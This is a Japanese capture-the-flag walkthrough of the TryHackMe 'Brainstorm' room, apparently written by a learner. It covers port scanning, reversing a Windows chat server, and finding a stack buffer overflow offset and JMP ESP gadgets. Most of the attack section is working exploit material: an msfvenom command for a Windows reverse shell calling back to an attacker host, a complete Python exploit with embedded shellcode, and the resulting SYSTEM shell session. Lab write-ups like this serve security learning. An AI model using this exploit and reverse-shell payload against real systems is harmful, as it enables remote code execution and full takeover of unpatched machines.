# Brainstorm CTF

https://tryhackme.com/room/brainstorm

## Enumeration

```shell
TARGET=10.201.96.120
```

### ポートスキャン

```sh
sudo nmap -vv -Pn -p- $TARGET

PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
9999/tcp open  abyss         syn-ack ttl 128
```

```sh
root@ip-10-201-84-8:~# nmap -sV -p21,3389,9999 $TARGET

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
3389/tcp open  tcpwrapped
9999/tcp open  abyss?
```

FTPと、その他２ポート。

### FTP

anonymousでログイン、passiveモードにして2ファイルダウンロード。

```sh
$ ls
chatserver.exe  essfunc.dll

$ file ./chatserver.exe 
./chatserver.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 7 sections

$ file ./essfunc.dll   
./essfunc.dll: PE32 executable (DLL) (console) Intel 80386 (stripped to external PDB), for MS Windows, 9 sections
```

## リバース

```c
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
  u_short uVar1;
  int iVar2;
  char *pcVar3;
  int aiStack_1dc [9];
  int iStack_1b8;
  WSADATA WStack_1b4;
  undefined1 auStack_22 [6];
  int iStack_1c;
  LPVOID pvStack_18;
  SOCKET SStack_14;
  int *piStack_10;
  
  piStack_10 = &_Argc;
  ___main();
  if (_Argc == 2) {
    strncpy(auStack_22,_Argv[1],6);
  }
  else {
    strncpy(auStack_22,&DAT_00404068,6);
  }
  puts("Chat Server started!");
  _EssentialFunc1();
  SStack_14 = 0xffffffff;
  pvStack_18 = (LPVOID)0xffffffff;
  iStack_1b8 = 0;
  iStack_1c = WSAStartup(0x202,&WStack_1b4);
  if (iStack_1c == 0) {
    memset(aiStack_1dc + 1,0,0x20);
    aiStack_1dc[2] = 2;
    aiStack_1dc[3] = 1;
    aiStack_1dc[4] = 6;
    aiStack_1dc[1] = 1;
    iStack_1c = getaddrinfo(0,auStack_22,aiStack_1dc + 1,&iStack_1b8);
    if (iStack_1c == 0) {
      SStack_14 = socket(*(int *)(iStack_1b8 + 4),*(int *)(iStack_1b8 + 8),
                         *(int *)(iStack_1b8 + 0xc));
      if (SStack_14 == 0xffffffff) {
        iVar2 = WSAGetLastError();
        _PrintWinsockError(iVar2);
        freeaddrinfo(iStack_1b8);
        WSACleanup();
        iVar2 = 1;
      }
      else {
        iStack_1c = bind(SStack_14,*(sockaddr **)(iStack_1b8 + 0x18),*(int *)(iStack_1b8 + 0x10));
        if (iStack_1c == -1) {
          iVar2 = WSAGetLastError();
          _PrintWinsockError(iVar2);
          closesocket(SStack_14);
          WSACleanup();
          iVar2 = 1;
        }
        else {
          freeaddrinfo(iStack_1b8);
          iStack_1c = listen(SStack_14,0x7fffffff);
          if (iStack_1c == -1) {
            iVar2 = WSAGetLastError();
            _PrintWinsockError(iVar2);
            closesocket(SStack_14);
            WSACleanup();
            iVar2 = 1;
          }
          else {
            puts("\nWaiting for connections.");
            while (SStack_14 != 0) {
              aiStack_1dc[0] = 0x10;
              pvStack_18 = (LPVOID)accept(SStack_14,(sockaddr *)&_ClientIP,aiStack_1dc);
              if (pvStack_18 == (LPVOID)0xffffffff) {
                iVar2 = WSAGetLastError();
                _PrintWinsockError(iVar2);
                closesocket(SStack_14);
                WSACleanup();
                return 1;
              }
              uVar1 = htons(DAT_004053d2);
              pcVar3 = inet_ntoa((in_addr)DAT_004053d4.S_un_b);
              printf("Received a client connection from %s:%u\n",pcVar3,uVar1);
              CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,
                           (LPTHREAD_START_ROUTINE)&_ConnectionHandler@4,pvStack_18,0,(LPDWORD)0x0);
            }
            closesocket(0);
            WSACleanup();
            iVar2 = 0;
          }
        }
      }
    }
    else {
      iVar2 = WSAGetLastError();
      _PrintWinsockError(iVar2);
      WSACleanup();
      iVar2 = 1;
    }
  }
  else {
    _PrintWinsockError(iStack_1c);
    iVar2 = 1;
  }
  return iVar2;
}
```

スレッドで実行される関数

```c
int UndefinedFunction_0040199e(int param_1)
{
  int iVar1;
  u_short uVar2;
  int iVar3;
  char *pcVar4;
  SOCKET SVar5;
  undefined1 *puVar6;
  undefined1 *puVar7;
  SOCKET *pSVar8;
  SOCKET *pSVar9;
  SOCKET *pSVar10;
  undefined4 *puVar11;
  undefined4 *puVar12;
  SOCKET *pSVar13;
  SOCKET *pSVar14;
  SOCKET *pSVar15;
  undefined4 *puVar16;
  SOCKET *pSVar17;
  undefined1 auStack_10a8 [4196];
  undefined1 auStack_44 [6];
  undefined1 auStack_3e [22];
  undefined4 uStack_28;
  int iStack_24;
  int iStack_20;
  int iStack_1c;
  SOCKET SStack_18;
  SOCKET SStack_14;
  int iStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0x4019ac;
  iVar3 = ___chkstk_ms();
  iVar3 = -iVar3;
  SStack_14 = 0x1000;
  *(undefined4 *)(&stack0xfffffff8 + iVar3) = 0x1000;
  *(undefined4 *)((int)&uStack_c + iVar3) = 0x4019c1;
  SStack_18 = malloc();
  *(undefined4 *)(&stack0x00000000 + iVar3) = 0x1000;
  *(undefined4 *)(&stack0xfffffffc + iVar3) = 0;
  *(SOCKET *)(&stack0xfffffff8 + iVar3) = SStack_18;
  *(undefined4 *)((int)&uStack_c + iVar3) = 0x4019df;
  memset();
  iVar1 = param_1;
  iStack_1c = param_1;
  *(undefined4 *)((int)&param_1 + iVar3) = 0;
  *(undefined4 *)(&stack0x00000000 + iVar3) = 0x21;
  *(char **)(&stack0xfffffffc + iVar3) = "Welcome to Brainstorm chat (beta)\n";
  *(int *)(&stack0xfffffff8 + iVar3) = iVar1;
  puVar6 = (undefined1 *)((int)&uStack_c + iVar3);
  *(undefined4 *)((int)&uStack_c + iVar3) = 0x401a0a;
  iStack_20 = send(*(SOCKET *)(&stack0xfffffff8 + iVar3),*(char **)(&stack0xfffffffc + iVar3),
                   *(int *)(&stack0x00000000 + iVar3),*(int *)((int)&param_1 + iVar3));
  *(undefined4 *)(puVar6 + -4) = 0;
  *(undefined4 *)(puVar6 + -8) = 0x31;
  *(char **)(puVar6 + -0xc) = "\nPlease enter your username (max 20 characters): \n";
  *(int *)(puVar6 + -0x10) = iStack_1c;
  puVar7 = puVar6 + -0x14;
  *(undefined4 *)(puVar6 + -0x14) = 0x401a35;
  iStack_20 = send(*(SOCKET *)(puVar6 + -0x10),*(char **)(puVar6 + -0xc),*(int *)(puVar6 + -8),
                   *(int *)(puVar6 + -4));
  pSVar13 = (SOCKET *)(puVar7 + -0x10);
  if (iStack_20 == -1) {
    pSVar8 = (SOCKET *)(puVar7 + -0x14);
    *(undefined4 *)(puVar7 + -0x14) = 0x401a48;
    iVar3 = WSAGetLastError();
    *pSVar8 = iVar3;
    pSVar8[-1] = 0x401a50;
    _PrintWinsockError();
    *pSVar8 = iStack_1c;
    pSVar8[-1] = 0x401a5d;
    closesocket(*pSVar8);
    iVar3 = 1;
  }
  else {
    iStack_10 = 0;
    *(undefined4 *)(puVar7 + -8) = 0x15;
    *(undefined4 *)(puVar7 + -0xc) = 0;
    *(undefined1 **)(puVar7 + -0x10) = auStack_3e + 1;
    *(undefined4 *)(puVar7 + -0x14) = 0x401a8c;
    iVar3 = memset();
    while (param_1 != 0) {
      pSVar13[3] = 0;
      pSVar13[2] = SStack_14;
      pSVar13[1] = SStack_18;
      *pSVar13 = iStack_1c;
      pSVar9 = pSVar13 + -1;
      pSVar13[-1] = 0x401ab4;
      iStack_24 = recv(*pSVar13,(char *)pSVar13[1],pSVar13[2],pSVar13[3]);
      if (iStack_24 < 1) {
        if (iStack_24 == 0) {
          pSVar9[-4] = (uint)DAT_004053d2;
          pSVar15 = pSVar9 + -5;
          pSVar9[-5] = 0x401c5c;
          uVar2 = htons((u_short)pSVar9[-4]);
          *(undefined4 *)((int)pSVar15 + -4) = DAT_004053d4;
          puVar16 = (undefined4 *)((int)pSVar15 + -8);
          *(undefined4 *)((int)pSVar15 + -8) = 0x401c71;
          pcVar4 = inet_ntoa((in_addr)((_union_1226 *)((int)pSVar15 + -4))->S_un_b);
          puVar16[1] = (uint)uVar2;
          *puVar16 = pcVar4;
          puVar16[-1] = "Client %s:%u closed connection.\n";
          puVar16[-2] = 0x401c88;
          printf();
          puVar16[-1] = iStack_1c;
          puVar16[-2] = 0x401c95;
          closesocket(puVar16[-1]);
          return 0;
        }
        pSVar17 = pSVar9 + -5;
        pSVar9[-5] = 0x401ca6;
        iVar3 = WSAGetLastError();
        *pSVar17 = iVar3;
        pSVar17[-1] = 0x401cae;
        _PrintWinsockError();
        *pSVar17 = iStack_1c;
        pSVar17[-1] = 0x401cbb;
        closesocket(*pSVar17);
        return 1;
      }
      if (iStack_10 == 1) {
        pSVar9[-4] = SStack_18;
        pSVar9[-5] = 0x401b9f;
        _Overflow();
        pSVar9[-4] = (SOCKET)auStack_44;
        pSVar9[-5] = 0x401baa;
        time();
        pSVar9[-4] = (SOCKET)auStack_44;
        pSVar9[-5] = 0x401bb5;
        uStack_28 = localtime();
        pSVar9[-4] = uStack_28;
        pSVar9[-5] = 0x401bc3;
        SVar5 = asctime();
        *pSVar9 = SStack_18;
        pSVar9[-1] = (SOCKET)(auStack_3e + 1);
        pSVar9[-2] = SVar5;
        pSVar9[-3] = (SOCKET)"\n\n%s%s said: %s\n\nWrite a message:  ";
        pSVar9[-4] = (SOCKET)auStack_10a8;
        pSVar9[-5] = 0x401beb;
        sprintf();
        pSVar9[-4] = (SOCKET)auStack_10a8;
        pSVar9[-5] = 0x401bf9;
        SVar5 = strlen();
        pSVar9[-1] = 0;
        pSVar9[-2] = SVar5;
        pSVar9[-3] = (SOCKET)auStack_10a8;
        pSVar9[-4] = iStack_1c;
        pSVar14 = pSVar9 + -5;
        pSVar9[-5] = 0x401c1c;
        iStack_20 = send(pSVar9[-4],(char *)pSVar9[-3],pSVar9[-2],pSVar9[-1]);
        pSVar13 = (SOCKET *)((int)pSVar14 + -0x10);
        *(undefined4 *)((int)pSVar14 + -8) = 0x1000;
        *(undefined4 *)((int)pSVar14 + -0xc) = 0;
        *(SOCKET *)((int)pSVar14 + -0x10) = SStack_18;
        *(undefined4 *)((int)pSVar14 + -0x14) = 0x401c3d;
        iVar3 = memset();
      }
      else {
        pSVar9[-2] = 0x15;
        pSVar9[-3] = SStack_18;
        pSVar9[-4] = (SOCKET)(auStack_3e + 1);
        pSVar9[-5] = 0x401ae8;
        strncat();
        pSVar9[-4] = (SOCKET)(auStack_3e + 1);
        pSVar9[-5] = 0x401af3;
        iVar3 = strlen();
        auStack_3e[iVar3] = 0;
        iStack_10 = 1;
        pSVar9[-2] = 0x1000;
        pSVar9[-3] = 0;
        pSVar9[-4] = SStack_18;
        pSVar9[-5] = 0x401b1d;
        memset();
        pSVar9[-4] = (uint)DAT_004053d2;
        pSVar10 = pSVar9 + -5;
        pSVar9[-5] = 0x401b31;
        uVar2 = htons((u_short)pSVar9[-4]);
        *(undefined4 *)((int)pSVar10 + -4) = DAT_004053d4;
        puVar11 = (undefined4 *)((int)pSVar10 + -8);
        *(undefined4 *)((int)pSVar10 + -8) = 0x401b46;
        pcVar4 = inet_ntoa((in_addr)((_union_1226 *)((int)pSVar10 + -4))->S_un_b);
        puVar11[2] = auStack_3e + 1;
        puVar11[1] = (uint)uVar2;
        *puVar11 = pcVar4;
        puVar11[-1] = "Client %s:%u selected username: %s\n";
        puVar11[-2] = 0x401b64;
        printf();
        puVar11[2] = 0;
        puVar11[1] = 0x11;
        *puVar11 = "Write a message: ";
        puVar11[-1] = iStack_1c;
        puVar12 = puVar11 + -2;
        puVar11[-2] = 0x401b89;
        iVar3 = send(puVar11[-1],(char *)*puVar11,puVar11[1],puVar11[2]);
        pSVar13 = (SOCKET *)((int)puVar12 + -0x10);
        iStack_20 = iVar3;
      }
    }
  }
  return iVar3;
}
```

バッファオーバーフロー系のコードとしてはかなり複雑。wineで実行してみる。

```sh
$ wine ./chatserver.exe
Chat Server started!
Called essential function dll version 1.00

Waiting for connections.
Received a client connection from 127.0.0.1:53602
Client 127.0.0.1:53602 selected username: name
```

```sh
$ nc localhost 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): name  
Write a message: hello


Sun Oct 12 08:48:25 2025
name said: hello


Write a message:  
```

`Write a message: ` の部分がループで繰り返される形。

パターン文字列を送ってバッファオーバーフローを発生させる。

```sh
$ nc localhost 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): name
Write a message: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmhabmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnza
```

```sh
wine: Unhandled page fault on read access to 75616164 at address 75616164 (thread 0128), starting debugger...
WineDbg attached to pid 0020
0130:fixme:dbghelp:elf_search_auxv can't find symbol in module
Unhandled exception: page fault on read access to 0x75616164 in wow64 32-bit code (0x75616164).
0130:fixme:dbghelp:elf_search_auxv can't find symbol in module
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:75616164 ESP:00eaee88 EBP:75616163 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:00eae6a8 EBX:0000af52 ECX:00eae6a8 EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x00eaee88:  75616165 75616166 75616167 75616168
0x00eaee98:  75616169 7561616a 7561616b 7561616c
0x00eaeea8:  7561616d 7561616e 7561616f 75616170
0x00eaeeb8:  75616171 75616172 75616173 75616174
0x00eaeec8:  75616175 75616176 75616177 75616178
0x00eaeed8:  75616179 7661617a 76616162 76616163
Backtrace:
=>0 0x75616164 (0x75616163)
0x75616164: -- no code accessible --
```

EIP の `0x75616164 -> 64 61 61 75 = daau` は2013文字目。

ret実行したときにESPはその4バイト先を指すようになるから、ESPにJMPする命令が入っているアドレスが得られれば、

```
(ダミー 2012 Bytes) + (ESPにJUMPするアドレス 4 bytes) + (シェルコード)
```

という形でコードを実行させることができる。

## JMP ESP

Immunity Debugger で JMP ESP を検索。

```sh
!mona jmp -r esp -cpb "\x00"
```

```txt
0BADF00D        [+] Results :
625014DF          0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
625014EB          0x625014eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
625014F7          0x625014f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
62501503          0x62501503 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
6250150F          0x6250150f : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
6250151B          0x6250151b : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
62501527          0x62501527 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
62501533          0x62501533 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
62501535          0x62501535 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\essfunc.dll), 0x0
0BADF00D            Found a total of 9 pointers
```

`0x625014df` など複数のアドレスが見つかった。

## シェルコード

リバースシェルのシェルコードを出力

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.146.32 LPORT=6666 exitfunc=thread -b "\x00" -f python
```

## エクスプロイト

```python
import socket

ip="10.201.108.229"
port=9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.recv(1024)

name = b"name"
s.send(name)

# ダミー
buf =  b"A" * 2012

# JMP ESP
buf += b"\xdf\x14\x50\x62"

# シェルコード
## NOP
buf += b"\x90" * 20
## リバースシェル
buf += b"\xbf\x6e\xc2\x4d\xee\xd9\xe1\xd9\x74\x24\xf4\x58"
buf += b"\x2b\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\xae"
buf += b"\xc6\xaf\x1b\xd2\x2f\xad\xe4\x2a\xb0\xd2\x6d\xcf"
buf += b"\x81\xd2\x0a\x84\xb2\xe2\x59\xc8\x3e\x88\x0c\xf8"
buf += b"\xb5\xfc\x98\x0f\x7d\x4a\xff\x3e\x7e\xe7\xc3\x21"
buf += b"\xfc\xfa\x17\x81\x3d\x35\x6a\xc0\x7a\x28\x87\x90"
buf += b"\xd3\x26\x3a\x04\x57\x72\x87\xaf\x2b\x92\x8f\x4c"
buf += b"\xfb\x95\xbe\xc3\x77\xcc\x60\xe2\x54\x64\x29\xfc"
buf += b"\xb9\x41\xe3\x77\x09\x3d\xf2\x51\x43\xbe\x59\x9c"
buf += b"\x6b\x4d\xa3\xd9\x4c\xae\xd6\x13\xaf\x53\xe1\xe0"
buf += b"\xcd\x8f\x64\xf2\x76\x5b\xde\xde\x87\x88\xb9\x95"
buf += b"\x84\x65\xcd\xf1\x88\x78\x02\x8a\xb5\xf1\xa5\x5c"
buf += b"\x3c\x41\x82\x78\x64\x11\xab\xd9\xc0\xf4\xd4\x39"
buf += b"\xab\xa9\x70\x32\x46\xbd\x08\x19\x0f\x72\x21\xa1"
buf += b"\xcf\x1c\x32\xd2\xfd\x83\xe8\x7c\x4e\x4b\x37\x7b"
buf += b"\xb1\x66\x8f\x13\x4c\x89\xf0\x3a\x8b\xdd\xa0\x54"
buf += b"\x3a\x5e\x2b\xa4\xc3\x8b\xfc\xf4\x6b\x64\xbd\xa4"
buf += b"\xcb\xd4\x55\xae\xc3\x0b\x45\xd1\x09\x24\xec\x28"
buf += b"\xda\x41\xfa\xa0\x3a\x3e\xfe\xc4\x20\xb4\x77\x22"
buf += b"\x3e\xd8\xd1\xfd\xd7\x41\x78\x75\x49\x8d\x56\xf0"
buf += b"\x49\x05\x55\x05\x07\xee\x10\x15\xf0\x1e\x6f\x47"
buf += b"\x57\x20\x45\xef\x3b\xb3\x02\xef\x32\xa8\x9c\xb8"
buf += b"\x13\x1e\xd5\x2c\x8e\x39\x4f\x52\x53\xdf\xa8\xd6"
buf += b"\x88\x1c\x36\xd7\x5d\x18\x1c\xc7\x9b\xa1\x18\xb3"
buf += b"\x73\xf4\xf6\x6d\x32\xae\xb8\xc7\xec\x1d\x13\x8f"
buf += b"\x69\x6e\xa4\xc9\x75\xbb\x52\x35\xc7\x12\x23\x4a"
buf += b"\xe8\xf2\xa3\x33\x14\x63\x4b\xee\x9c\x83\xae\x3a"
buf += b"\xe9\x2b\x77\xaf\x50\x36\x88\x1a\x96\x4f\x0b\xae"
buf += b"\x67\xb4\x13\xdb\x62\xf0\x93\x30\x1f\x69\x76\x36"
buf += b"\x8c\x8a\x53"

s.recv(1024)
s.send(buf)
```

SYSTEMのシェル取得成功。

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.63.218] 49178
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

フラグ入手

```sh
C:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  10:55 PM    <DIR>          .
08/29/2019  10:55 PM    <DIR>          ..
08/29/2019  10:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,703,779,328 bytes free

C:\Users\drake\Desktop>type root.txt
```


## 振り返り

- mona は使い慣れていないので良い勉強になった。
-
